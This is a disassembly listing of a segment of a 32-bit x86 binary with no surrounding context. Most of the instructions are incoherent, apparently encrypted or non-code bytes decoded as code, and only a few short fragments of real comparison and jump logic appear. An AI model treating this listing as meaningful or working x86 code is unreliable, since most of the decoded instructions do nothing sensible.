  40b2c8:	jp     0x40b290
  40b2ca:	cmp    BYTE PTR [ecx+ebp*8],dl
  40b2cd:	xchg   edx,eax
  40b2ce:	push   cs
  40b2cf:	arpl   WORD PTR [ecx+0x5a],cx
  40b2d2:	adc    edx,DWORD PTR [ebp-0x78]
  40b2d5:	xchg   ecx,eax
  40b2d6:	mov    ah,BYTE PTR [edx]
  40b2d8:	popa   
  40b2d9:	pop    eax
  40b2da:	pop    ecx
  40b2db:	and    eax,0x3801d354
  40b2e0:	loopne 0x40b323
  40b2e2:	push   es
  40b2e3:	xlat   BYTE PTR ds:[ebx]
  40b2e4:	push   ds
  40b2e5:	arpl   WORD PTR [eax],cx
  40b2e7:	dec    ecx
  40b2e8:	daa    
  40b2e9:	sub    al,0xc5
  40b2eb:	inc    edi
  40b2ec:	jle    0x40b27f
  40b2ee:	dec    eax
  40b2ef:	dec    ecx
  40b2f0:	sbb    BYTE PTR [edx+0x72d1e876],bl
  40b2f6:	(bad)  
  40b2f7:	push   ds
  40b2f8:	inc    ecx
  40b2fa:	ror    BYTE PTR [edi+eax*1-0x5d],0x6d
  40b2ff:	(bad)  
  40b301:	or     al,dl
  40b303:	xor    BYTE PTR [ebp+0x2f366683],bh
  40b309:	in     eax,dx
  40b30a:	sub    DWORD PTR [ecx-0x11],ebp
  40b30d:	fs cs push edi
  40b310:	jmp    0x40b2d5
  40b312:	add    DWORD PTR [ebp*8-0x3958435],edx
  40b319:	int3   
  40b31a:	xchg   ecx,eax
  40b31b:	das    
  40b31c:	pusha  
  40b31d:	test   al,0x13
  40b31f:	mov    ah,0x71
  40b321:	ins    DWORD PTR es:[edi],dx
  40b322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b323:	imul   esp,DWORD PTR [ebx-0xdd1cbc3],0xfe7c51f8
  40b32d:	or     ebx,DWORD PTR [ebp+0x1f]
  40b330:	add    DWORD PTR [esi-0x53],eax
  40b333:	xor    BYTE PTR [ebx],cl
  40b335:	stc    
  40b336:	and    dh,BYTE PTR [ebx]
  40b338:	mov    al,0x8f
  40b33a:	or     ecx,DWORD PTR [eax-0x1fa78af3]
  40b340:	int    0xf0
  40b342:	push   esp
  40b343:	mov    esp,0xb88db5ce
  40b348:	add    cl,BYTE PTR [edi+0x4c869318]
  40b34e:	iret   
  40b34f:	je     0x40b3bd
  40b351:	out    dx,eax
  40b352:	inc    edi
  40b353:	inc    edx
  40b354:	sbb    DWORD PTR [ecx+0x27],ecx
  40b357:	sbb    edi,DWORD PTR [edi+0x77a873b8]
  40b35d:	test   BYTE PTR [edi+ecx*1+0x5ab6cec0],0xe2
  40b365:	jl     0x40b330
  40b367:	rol    bl,0xa4
  40b36a:	xchg   edi,eax
  40b36b:	mov    DWORD PTR [eax],esp
  40b36d:	mov    edx,0xc4cb064b
  40b372:	fadd   st(5),st
  40b374:	fdivr  DWORD PTR [esi+0x69]
  40b377:	test   BYTE PTR [ebp+0x7],bh
  40b37a:	mov    ebx,0xc83a121c
  40b37f:	lods   al,BYTE PTR ds:[esi]
  40b380:	fidivr DWORD PTR [edx-0x5e56729c]
  40b386:	sbb    edi,DWORD PTR [ebx+ecx*1+0x68c124b6]
  40b38d:	ss xor al,0x9c
  40b390:	mov    edx,0x89941e1a
  40b395:	sub    BYTE PTR [edi-0x53],0x93
  40b399:	iret   
  40b39a:	std    
  40b39b:	fild   WORD PTR [ebp-0x7d64686b]
  40b3a1:	sub    DWORD PTR gs:[ecx-0x6f],edi
  40b3a5:	mov    ds:0x67ae2b9e,eax
  40b3aa:	fdivr  QWORD PTR [ebx-0xf54619b]
  40b3b0:	fld    QWORD PTR [ebx-0xc4dbc79]
  40b3b6:	out    0xbf,al
  40b3b8:	and    BYTE PTR [edi+0x6d720cb1],dh
  40b3be:	xor    dl,bl
  40b3c0:	outs   dx,BYTE PTR ds:[esi]
  40b3c1:	sbb    esp,DWORD PTR [ecx+0x7da402b7]
  40b3c7:	rcr    DWORD PTR [eax-0x44],0x19
  40b3cb:	ret    
  40b3cc:	into   
  40b3cd:	mov    al,0xed
  40b3cf:	cdq    
  40b3d0:	cli    
  40b3d1:	test   eax,0xd273706b
  40b3d6:	push   ecx
  40b3d7:	ins    BYTE PTR es:[edi],dx
  40b3d8:	sub    al,0x49
  40b3da:	ins    DWORD PTR es:[edi],dx
  40b3db:	push   ebx
  40b3dc:	pop    ds
  40b3dd:	mov    ebp,0xaa43f47d
  40b3e2:	push   esp
  40b3e3:	add    DWORD PTR [ecx+0x30136bed],ebx
  40b3e9:	pusha  
  40b3ea:	retf   
  40b3eb:	xchg   esp,eax
  40b3ec:	clc    
  40b3ed:	xchg   DWORD PTR [edi-0x5851a342],eax
  40b3f3:	(bad)  
  40b3f4:	mov    DWORD PTR [ebx-0x58],0xcc57b74b
  40b3fb:	push   esp
  40b3fc:	pop    ecx
  40b3fd:	in     eax,0x78
  40b3ff:	mov    al,ds:0x4a44e9ef
  40b404:	dec    ebx
  40b405:	or     dl,BYTE PTR [ebx-0x7e]
  40b408:	in     al,0xb0
  40b40a:	(bad)  
  40b40b:	pop    ecx
  40b40c:	fwait
  40b40d:	std    
  40b40e:	sti    
  40b40f:	gs xchg edi,eax
  40b411:	pop    edx
  40b412:	ror    DWORD PTR [edx+0x32],cl
  40b415:	xchg   esp,eax
  40b416:	std    
  40b417:	jmp    0x560ed83d
  40b41c:	xor    al,0x31
  40b41e:	jns    0x40b46a
  40b420:	mov    esi,0x3382842f
  40b425:	jmp    0xe1478d19
  40b42a:	or     al,ch
  40b42c:	push   eax
  40b42d:	mov    ebp,0xfeb92bc2
  40b432:	jns    0x40b3da
  40b434:	cs ret 
  40b436:	adc    DWORD PTR [eax-0x2db34aab],edx
  40b43c:	sub    ebp,ebp
  40b43e:	stos   BYTE PTR es:[edi],al
  40b43f:	punpckhbw mm4,QWORD PTR [esi+0x27]
  40b443:	ret    0x4dd8
  40b446:	xchg   ch,bh
  40b448:	xchg   esi,ecx
  40b44a:	(bad)  
  40b44b:	sbb    bl,BYTE PTR [ebp+ebx*2-0x577b31fb]
  40b452:	test   BYTE PTR [esi],al
  40b454:	sub    al,0x6b
  40b456:	sub    al,0xff
  40b458:	aaa    
  40b459:	xchg   edx,eax
  40b45a:	mov    cl,BYTE PTR [edi+edx*2+0x1fd58d6b]
  40b461:	in     eax,0x8c
  40b463:	outs   dx,BYTE PTR ds:[esi]
  40b464:	scas   al,BYTE PTR es:[edi]
  40b465:	sub    bl,BYTE PTR [ebx-0x667688d6]
  40b46b:	sbb    eax,0xe7083476
  40b470:	xor    eax,0x2d75438a
  40b475:	push   esi
  40b476:	pop    ds
  40b477:	jmp    0xcd837652
  40b47c:	(bad)  
  40b47d:	lds    edi,FWORD PTR [ecx+edx*2-0x1f]
  40b481:	int    0x49
  40b483:	mov    esi,0xe7a8f6cb
  40b488:	mov    ds:0x23eaad1b,al
  40b48d:	pusha  
  40b48e:	and    BYTE PTR [edx-0x7e8c26e6],al
  40b494:	aam    0xac
  40b496:	add    BYTE PTR [ebx-0xb3241e],al
  40b49c:	and    ebx,edi
  40b49e:	inc    esi
  40b49f:	mov    edx,0xc1a43635
  40b4a4:	sti    
  40b4a5:	repnz iret 
  40b4a7:	push   0xffffff89
  40b4a9:	ins    DWORD PTR es:[edi],dx
  40b4aa:	push   es
  40b4ab:	pop    esp
  40b4ac:	sbb    eax,0x2a7fc774
  40b4b1:	das    
  40b4b2:	dec    ecx
  40b4b3:	push   es
  40b4b4:	jl     0x40b49e
  40b4b6:	mov    WORD PTR [edi+ecx*1+0x3cf96e6e],ds
  40b4bd:	pop    esi
  40b4be:	outs   dx,BYTE PTR ds:[esi]
  40b4bf:	bound  edx,QWORD PTR [ebp+0x6f]
  40b4c2:	xlat   BYTE PTR ds:[ebx]
  40b4c3:	lods   eax,DWORD PTR ds:[esi]
  40b4c4:	out    0x74,al
  40b4c6:	gs pop ds
  40b4c8:	jne    0x40b4b5
  40b4ca:	inc    ebp
  40b4cb:	cmp    esi,DWORD PTR [esi+0x1af67a44]
  40b4d1:	mov    edi,0xa83255d1
  40b4d6:	mov    edx,0xe12e3853
  40b4db:	bound  edx,QWORD PTR [ecx-0x6efd5fba]
  40b4e1:	(bad)  
  40b4e2:	clc    
  40b4e3:	xor    eax,0xe6d4f97c
  40b4e8:	dec    esp
  40b4e9:	xor    eax,0x254c95e6
  40b4ee:	adc    BYTE PTR [ecx],bh
  40b4f0:	jecxz  0x40b501
  40b4f2:	dec    ebp
  40b4f3:	sub    ch,BYTE PTR [esi+0x2ef71e7f]
  40b4f9:	scas   al,BYTE PTR es:[edi]
  40b4fa:	dec    ebx
  40b4fb:	(bad)  
  40b4fc:	lods   eax,DWORD PTR cs:[esi]
  40b4fe:	xchg   DWORD PTR [edx+eax*4-0x62],esp
  40b502:	xchg   esi,eax
  40b503:	push   cs
  40b504:	push   eax
  40b505:	pop    eax
  40b506:	mov    DWORD PTR [eax-0x1],edi
  40b509:	sbb    al,0xe8
  40b50b:	xchg   ebp,eax
  40b50c:	int    0x17
  40b50e:	jo     0x40b584
  40b510:	mov    ?,WORD PTR cs:[eax+0x2a]
  40b514:	inc    ebp
  40b515:	sbb    eax,0xd5fbcba0
  40b51a:	call   0x7e00e1bf
  40b51f:	cs imul edx,edi
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	push   edx
  40b550:	xchg   esp,esp
  40b552:	enter  0x86c1,0x70
  40b556:	jo     0x40b4f7
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b5c4
  40b55c:	mov    al,ds:0x3ec0760c
  40b561:	xor    DWORD PTR [ecx-0x73],edx
  40b564:	dec    ebx
  40b565:	jb     0x40b590
  40b567:	call   0xa370aff1
  40b56c:	fidivr DWORD PTR [eax]
  40b56e:	repz aaa 
  40b570:	test   DWORD PTR [edx],ecx
  40b572:	xor    dh,bh
  40b574:	test   bh,cl
  40b576:	das    
  40b577:	outs   dx,BYTE PTR ds:[esi]
  40b578:	imul   esp,DWORD PTR [ebx],0xe5866820
  40b57e:	push   ebx
  40b57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b580:	mov    esp,0x416765d4
  40b585:	mov    ebp,0x560534ec
  40b58a:	xor    al,BYTE PTR [eax+edi*8-0x680afe0a]
  40b591:	xchg   esi,eax
  40b592:	mov    BYTE PTR [ecx+0x520d250],dh
  40b598:	xchg   ebx,eax
  40b599:	popf   
  40b59a:	aaa    
  40b59b:	xor    eax,0xab3794fb
  40b5a0:	mov    bl,0x60
  40b5a2:	test   eax,0x1912e7cc
  40b5a7:	gs icebp 
  40b5a9:	fistp  WORD PTR [ecx-0x6f6e37bd]
  40b5af:	retf   
  40b5b0:	imul   esi,DWORD PTR [ebx+0x2b],0x14
  40b5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5b5:	in     al,dx
  40b5b6:	ja     0x40b57f
  40b5b8:	adc    bl,BYTE PTR [ebx+0x15]
  40b5bb:	jmp    0xdbb2c6d0
  40b5c0:	adc    ch,BYTE PTR [esi-0x5aff3ba]
  40b5c6:	jnp    0x40b59a
  40b5c8:	not    ebp
  40b5ca:	test   DWORD PTR [ecx-0x7c180598],ecx
  40b5d0:	xchg   edi,eax
  40b5d1:	xchg   esp,eax
  40b5d2:	mov    ch,0x2c
  40b5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5d5:	aas    
  40b5d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5d7:	les    esi,FWORD PTR [edi+eax*8+0x4128799d]
  40b5de:	push   eax
  40b5df:	shr    dh,0x91
  40b5e2:	mov    esp,0x61e01372
  40b5e7:	lock push edi
  40b5e9:	xchg   ebx,eax
  40b5ea:	test   eax,0xcda98041
  40b5ef:	gs xchg ecx,eax
  40b5f1:	icebp  
  40b5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5f3:	in     eax,0xa8
  40b5f5:	push   cs
  40b5f6:	cmp    ecx,edx
  40b5f8:	ror    DWORD PTR [ebx+ebp*8+0x67],1
  40b5fc:	and    DWORD PTR [edi],edx
  40b5fe:	cmp    BYTE PTR [esp+esi*8-0x223d09ff],al
  40b605:	test   eax,0x11f811bc
  40b60a:	xor    DWORD PTR [ecx],0xc3ffb65
  40b610:	jmp    0xbccbf4de
  40b615:	push   ecx
  40b616:	dec    esi
  40b617:	xchg   edx,eax
  40b618:	shl    BYTE PTR [ebx-0x7e],1
  40b61b:	lods   al,BYTE PTR ds:[esi]
  40b61c:	jnp    0x40b65a
  40b61e:	dec    eax
  40b61f:	lahf   
  40b620:	jo     0x40b648
  40b622:	addr16 aad 0x83
  40b625:	in     al,0xed
  40b627:	bound  esi,QWORD PTR [edx+edx*8-0x5f]
  40b62b:	xchg   al,al
  40b62d:	mov    al,ds:0x57320a9a
  40b632:	pop    ss
  40b633:	jne    0x40b613
  40b635:	ins    DWORD PTR es:[edi],dx
  40b636:	sahf   
  40b637:	pop    es
  40b638:	inc    edx
  40b639:	mov    al,dh
  40b63b:	in     al,0x57
  40b63d:	jmp    0x20a4309b
  40b642:	inc    edx
  40b643:	hlt    
  40b644:	mov    esp,DWORD PTR es:[ecx+0x5264533a]
  40b64b:	xchg   esi,eax
  40b64c:	or     BYTE PTR [edx+0x5],dl
  40b64f:	pop    edi
  40b650:	cmp    ebp,eax
  40b652:	aam    0xcf
  40b654:	pop    edi
  40b655:	ficom  WORD PTR [edi+0x7c12014c]
  40b65b:	pop    es
  40b65c:	inc    esi
  40b65d:	push   ebx
  40b65e:	test   BYTE PTR [ecx+0x496fb9e],0x2a
  40b665:	leave  
  40b666:	pop    ds
  40b667:	repnz inc esi
  40b669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b66a:	adc    edx,DWORD PTR [ecx-0x4]
  40b66d:	push   edi
  40b66e:	out    0xaf,al
  40b670:	pop    ebp
  40b671:	mov    bh,0xff
  40b673:	leave  
  40b674:	inc    ebp
  40b675:	rol    edi,cl
  40b677:	jp     0x40b6f5
  40b679:	push   ebx
  40b67a:	(bad)  
  40b67b:	jmp    0x4eb4:0xd3aea2c9
  40b682:	es adc ah,bh
  40b685:	sbb    ecx,DWORD PTR [esi]
  40b687:	sbb    BYTE PTR [eax-0x73],ah
  40b68a:	test   BYTE PTR [eax],dl
  40b68c:	add    BYTE PTR [eax-0x7430244a],dl
  40b692:	inc    edi
  40b693:	sbb    DWORD PTR [esi],edx
  40b695:	sti    
  40b696:	fsubrp st(3),st
  40b698:	mov    al,0x41
  40b69a:	cmp    BYTE PTR [edi-0x27af0cfa],bh
  40b6a0:	mov    dh,0x4a
  40b6a2:	cwde   
  40b6a3:	leave  
  40b6a4:	outs   dx,DWORD PTR ds:[esi]
  40b6a5:	push   cs
  40b6a6:	jno    0x40b716
  40b6a8:	jno    0x40b6e6
  40b6aa:	imul   eax,DWORD PTR [ebx-0x21933d27],0xffffffd0
  40b6b1:	dec    ecx
  40b6b2:	xlat   BYTE PTR cs:[ebx]
  40b6b4:	int3   
  40b6b5:	call   0xab05a78c
  40b6ba:	push   eax
  40b6bb:	lods   eax,DWORD PTR ds:[esi]
  40b6bc:	pop    edx
  40b6bd:	sub    eax,0x4d6803ae
  40b6c2:	sti    
  40b6c3:	push   ecx
  40b6c4:	push   ss
  40b6c5:	ss xchg ebp,eax
  40b6c7:	bound  ebp,QWORD PTR [ebx-0x15]
  40b6ca:	jnp    0x40b6b8
  40b6cc:	repnz xchg ebx,eax
  40b6ce:	ficom  DWORD PTR [esi]
  40b6d0:	or     BYTE PTR [ebp+0x5cee0f75],dh
  40b6d6:	test   ebx,ebx
  40b6d8:	repz ja 0x40b6e5
  40b6db:	and    al,0x1
  40b6dd:	icebp  
  40b6de:	std    
  40b6df:	xor    BYTE PTR [esi],bl
  40b6e1:	ret    0xef1c
  40b6e4:	and    eax,0xb9914fbc
  40b6e9:	push   ebp
  40b6ea:	lock pusha 
  40b6ec:	dec    BYTE PTR [edi+ecx*8-0x2]
  40b6f0:	add    edi,DWORD PTR [edx+ebx*2-0x706ee1f6]
  40b6f7:	pop    ss
  40b6f8:	pop    eax
  40b6f9:	sub    al,0xa
  40b6fb:	push   ebp
  40b6fc:	mov    ah,0xcb
  40b6fe:	cwde   
  40b6ff:	(bad)  
  40b700:	jp     0x40b754
  40b702:	cwde   
  40b703:	push   edx
  40b704:	ret    
  40b705:	lock mov eax,ds:0x37c2574b
  40b70b:	pop    ds
  40b70c:	jl     0x40b716
  40b70e:	jle    0x40b6ee
  40b710:	aad    0xa9
  40b712:	ins    BYTE PTR es:[edi],dx
  40b713:	outs   dx,DWORD PTR ds:[esi]
  40b714:	pop    ss
  40b715:	clc    
  40b716:	call   0x4a71cd3f
  40b71b:	popf   
  40b71c:	and    BYTE PTR [ebx+0x18],0xa8
  40b720:	pop    ebx
  40b721:	or     BYTE PTR [ebx],bl
  40b723:	in     eax,dx
  40b724:	xchg   esp,ebp
  40b726:	scas   eax,DWORD PTR es:[edi]
  40b727:	aaa    
  40b728:	dec    ebp
  40b729:	pop    ss
  40b72a:	aad    0xa
  40b72c:	pop    ecx
  40b72d:	lods   eax,DWORD PTR ds:[esi]
  40b72e:	cs xchg ebx,eax
  40b730:	ret    
  40b731:	jg     0x40b6c9
  40b733:	inc    edi
  40b734:	jl     0x40b73a
  40b736:	fsubr  st,st(7)
  40b738:	rcr    esi,0xee
  40b73b:	in     al,dx
  40b73c:	inc    edx
  40b73d:	sbb    al,0xf2
  40b73f:	test   al,0x53
  40b741:	pop    eax
  40b742:	and    esi,eax
  40b744:	or     al,BYTE PTR [esi-0xe]
  40b747:	retf   
  40b748:	clc    
  40b749:	xchg   ebp,eax
  40b74b:	stos   DWORD PTR es:[edi],eax
  40b74c:	data16 mov BYTE PTR [edi-0x2d8b05fd],0x84
  40b754:	test   al,0x3
  40b756:	mov    edx,0xd0ad4a0a
  40b75b:	sub    DWORD PTR [ebx-0x62205521],edi
  40b761:	ja     0x40b71e
  40b763:	jp     0x40b75f
  40b765:	mov    dl,0x41
  40b767:	pop    ebx
  40b768:	out    dx,al
  40b769:	sbb    eax,DWORD PTR [esi]
  40b76b:	pop    eax
  40b76c:	jl     0x40b7d2
  40b76e:	(bad)  
  40b76f:	and    BYTE PTR [ebx+0x4dbe3c73],bl
  40b775:	xor    eax,DWORD PTR [edi]
  40b777:	lea    ebx,[edi]
  40b779:	jb     0x40b7f6
  40b77b:	scas   al,BYTE PTR es:[edi]
  40b77c:	cld    
  40b77d:	dec    ebp
  40b77e:	sub    BYTE PTR [esi+0x6f],dh
  40b781:	in     eax,dx
  40b782:	hlt    
  40b783:	ins    DWORD PTR es:[edi],dx
  40b784:	pop    es
  40b785:	(bad)  
  40b786:	in     eax,dx
  40b787:	sub    BYTE PTR [edx+0x3d5240a],ch
  40b78d:	(bad)  
  40b78e:	xchg   esp,eax
  40b78f:	div    edi
  40b791:	push   cs
  40b792:	or     eax,0xc4f1d533
  40b797:	bound  edx,QWORD PTR [esi-0x3d]
  40b79a:	sar    DWORD PTR [esi+eiz*1],cl
  40b79d:	sbb    esp,DWORD PTR [eax]
  40b79f:	cdq    
  40b7a0:	pop    edi
  40b7a1:	mov    cl,0x1a
  40b7a3:	adc    BYTE PTR [edx+0xd02a60b],0x33
  40b7aa:	setbe  BYTE PTR [eax+eax*2+0x5999f739]
  40b7b2:	add    BYTE PTR [ecx],0x74
  40b7b5:	pushf  
  40b7b6:	outs   dx,BYTE PTR ds:[esi]
  40b7b7:	mov    ebx,DWORD PTR [eax-0x1b]
  40b7ba:	push   0xffffffab
  40b7bc:	xchg   ebp,eax
  40b7bd:	jge    0x40b817
  40b7bf:	mov    bl,0x86
  40b7c1:	leave  
  40b7c2:	fimul  WORD PTR [eax]
  40b7c4:	lock inc ebp
  40b7c6:	bound  eax,QWORD PTR ds:0xeb536e62
  40b7cc:	and    al,0xcb
  40b7ce:	mov    eax,ds:0xab9882da
  40b7d3:	retf   0x5cfa
  40b7d6:	jns    0x40b7b8
  40b7d8:	jecxz  0x40b79f
  40b7da:	pop    ecx
  40b7db:	jp     0x40b80e
  40b7dd:	mov    dl,0xbc
  40b7df:	cmp    eax,0xd5c58576
  40b7e4:	inc    BYTE PTR [ecx+ebp*2+0x5993e8a]
  40b7eb:	sub    bh,0x22
  40b7ee:	test   al,0x98
  40b7f0:	push   edi
  40b7f1:	fisubr DWORD PTR [ebx+ebx*4-0x56883d18]
  40b7f8:	gs das 
  40b7fa:	add    al,0xcf
  40b7fc:	jge    0x40b81b
  40b7fe:	aas    
  40b7ff:	loop   0x40b85c
  40b801:	outs   dx,BYTE PTR ds:[esi]
  40b802:	rcr    dl,cl
  40b804:	int3   
  40b805:	xor    edx,DWORD PTR [eax+0x65]
  40b808:	pop    esp
  40b809:	lods   eax,DWORD PTR ds:[esi]
  40b80a:	in     eax,0xff
  40b80c:	aam    0x65
  40b80e:	mov    bl,0xad
  40b810:	test   eax,0x3bb00ff2
  40b815:	xor    eax,DWORD PTR [edx+0x2ded4a66]
  40b81b:	scas   al,BYTE PTR es:[edi]
  40b81c:	sbb    DWORD PTR ds:0xc3147aa1,0x34ec4e28
  40b826:	jmp    0x608484b7
  40b82b:	cld    
  40b82c:	and    eax,DWORD PTR [edx+eax*8]
  40b82f:	sbb    eax,0xa28bd171
  40b834:	mov    DWORD PTR ds:0x70daa12d,eax
  40b83a:	mov    ebp,0x58fe6447
  40b83f:	retf   
  40b840:	dec    ebx
  40b841:	ss (bad) 
  40b843:	stc    
  40b844:	cmp    cl,BYTE PTR ds:0x22dae26
  40b84a:	dec    edx
  40b84b:	and    bl,BYTE PTR ds:0xd8746dfd
  40b851:	popf   
  40b852:	les    eax,FWORD PTR [ebx+0x2a6f903c]
  40b858:	dec    BYTE PTR [edx+0x6f099d9d]
  40b85e:	pusha  
  40b85f:	into   
  40b860:	loop   0x40b8d3
  40b862:	out    dx,eax
  40b863:	test   DWORD PTR [edx-0x7dc47673],ebp
  40b869:	lds    eax,FWORD PTR [ecx+ebp*2]
  40b86c:	inc    edx
  40b86d:	jp     0x40b88e
  40b86f:	cld    
  40b870:	sbb    BYTE PTR [ecx],dl
  40b872:	xchg   edx,eax
  40b873:	loop   0x40b833
  40b875:	cmp    eax,0x5935263e
  40b87a:	(bad)  
  40b87b:	cmp    dl,BYTE PTR [esi-0x2e341ad3]
  40b881:	or     eax,0x60d2d754
  40b886:	sar    cl,cl
  40b888:	fs mov dl,0x89
  40b88b:	imul   edx,eax,0x57
  40b88e:	dec    eax
  40b88f:	mov    BYTE PTR [edx+0x2b5e1141],ah
  40b895:	std    
  40b896:	shl    DWORD PTR [eax-0x8615f5],1
  40b89c:	outs   dx,BYTE PTR ds:[esi]
  40b89d:	ss jne 0x40b88d
  40b8a0:	loopne 0x40b883
  40b8a2:	out    dx,al
  40b8a3:	push   esi
  40b8a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a5:	inc    edi
  40b8a6:	lds    edx,FWORD PTR ds:0x67f0eda3
  40b8ac:	xor    BYTE PTR [edx],al
  40b8ae:	out    0xe0,al
  40b8b0:	adc    eax,0x484952fa
  40b8b5:	(bad)  
  40b8b6:	xchg   ebp,eax
  40b8b7:	adc    ebp,DWORD PTR [edi]
  40b8b9:	add    BYTE PTR [ecx],ch
  40b8bb:	int    0x51
  40b8bd:	mov    al,ds:0x4b51c136
  40b8c2:	lds    edi,FWORD PTR [ebp-0x5f]
  40b8c5:	iret   
  40b8c6:	fldcw  WORD PTR [esi]
  40b8c8:	xchg   ebp,eax
  40b8c9:	clc    
  40b8ca:	scas   al,BYTE PTR es:[edi]
  40b8cb:	and    ch,al
  40b8cd:	test   al,0x46
  40b8cf:	sbb    bh,ah
  40b8d1:	pop    ecx
  40b8d2:	leave  
  40b8d3:	rcl    BYTE PTR fs:[ebx],1
  40b8d6:	and    BYTE PTR [eax-0x56],dl
  40b8d9:	out    dx,al
  40b8da:	push   0xffffffe7
  40b8dc:	(bad)
  40b8e0:	push   edi
  40b8e1:	test   BYTE PTR [edi-0x55],ch
  40b8e4:	(bad)  
  40b8e5:	ds jmp 0xe6ea2c9b
  40b8eb:	add    BYTE PTR [edx-0x7c],bl
  40b8ee:	sub    dl,dh
  40b8f0:	jle    0x40b8f1
  40b8f2:	test   al,0x86
  40b8f4:	sti    
  40b8f5:	and    bl,BYTE PTR [edi-0x369c5318]
  40b8fb:	sbb    cl,BYTE PTR [ebx-0x2fcc0383]
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x636c9905],cl
  40b949:	adc    dl,al
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b8ff
  40b954:	pop    ds
  40b955:	jmp    0x4d18:0x9fa4e71d
  40b95c:	sar    DWORD PTR [eax-0x7bf4e6e3],cl
  40b962:	jecxz  0x40b91a
  40b964:	cmp    bh,cl
  40b966:	test   BYTE PTR [edi],ah
  40b968:	ds pop edx
  40b96a:	jno    0x40b9b6
  40b96c:	out    0x35,eax
  40b96e:	inc    eax
  40b96f:	std    
  40b970:	add    BYTE PTR [eax-0x48a0c907],bl
  40b976:	push   es
  40b977:	cld    
  40b978:	iret   
  40b979:	xchg   ebx,eax
  40b97a:	rcr    DWORD PTR [esp+esi*2+0x3e],1
  40b97e:	mov    esp,0x25386a3
  40b983:	loope  0x40b99d
  40b985:	sub    al,0xdc
  40b987:	pop    ebp
  40b988:	jae    0x40b9ae
  40b98a:	pop    esi
  40b98b:	push   ss
  40b98c:	gs jmp 0x40b9ee
  40b98f:	xchg   edx,eax
  40b990:	adc    eax,0xe4a2a731
  40b995:	icebp  
  40b996:	adc    BYTE PTR ds:0x4353841a,cl
  40b99c:	jns    0x40b95c
  40b99e:	or     BYTE PTR [edx],al
  40b9a0:	in     al,dx
  40b9a1:	push   ebp
  40b9a2:	mov    dh,0x6d
  40b9a4:	mul    BYTE PTR [eax]
  40b9a6:	inc    edi
  40b9a7:	std    
  40b9a8:	jp     0x40b9db
  40b9aa:	xchg   DWORD PTR [edi-0x69],esi
  40b9ad:	jo     0x40b9a4
  40b9af:	and    al,0xc6
  40b9b1:	in     al,dx
  40b9b2:	out    dx,eax
  40b9b3:	jbe    0x40b96f
  40b9b5:	test   esi,ebx
  40b9b7:	cmp    eax,0xe54f2bd3
  40b9bc:	inc    esi
  40b9bd:	add    eax,0x7d69ce4d
  40b9c2:	inc    esi
  40b9c3:	pop    ebx
  40b9c4:	xor    bh,BYTE PTR ds:0x67c77b8b
  40b9ca:	mov    esi,esp
  40b9cc:	mov    esi,DWORD PTR [edi]
  40b9ce:	int3   
  40b9cf:	adc    BYTE PTR [ebx],bh
  40b9d1:	inc    edx
  40b9d2:	cmp    al,0xb8
  40b9d4:	push   esp
  40b9d5:	cmp    eax,DWORD PTR [eax+eax*2+0x1967b9d7]
  40b9dc:	sahf   
  40b9dd:	mov    ch,0xca
  40b9df:	leave  
  40b9e0:	daa    
  40b9e1:	add    DWORD PTR [esp+eax*8],ecx
  40b9e4:	(bad)  
  40b9e5:	scas   al,BYTE PTR es:[edi]
  40b9e6:	aam    0xcb
  40b9e8:	lea    edi,[edi+ebp*2+0x6877fcbd]
  40b9ef:	fcomp  DWORD PTR [edx+0x67943e0]
  40b9f5:	or     esp,esi
  40b9f7:	mov    ds:0x8c5d031a,al
  40b9fc:	lock loop 0x40ba75
  40b9ff:	out    dx,eax
  40ba00:	lahf   
  40ba01:	sbb    al,0x7a
  40ba03:	imul   BYTE PTR [ecx+0x365790fd]
  40ba09:	dec    esp
  40ba0a:	aaa    
  40ba0b:	dec    ebp
  40ba0c:	add    esi,esi
  40ba0e:	push   0xffffffcc
  40ba10:	cmp    BYTE PTR [ebp-0x7a],dh
  40ba13:	pop    esp
  40ba14:	push   es
  40ba15:	bound  edi,QWORD PTR [ebp-0x3caf4168]
  40ba1b:	push   edi
  40ba1c:	call   0xebc:0xa7759e3b
  40ba23:	and    BYTE PTR [ecx+0x18cdac69],ch
  40ba29:	xlat   BYTE PTR ds:[ebx]
  40ba2a:	dec    eax
  40ba2b:	ret    0x9074
  40ba2e:	in     al,dx
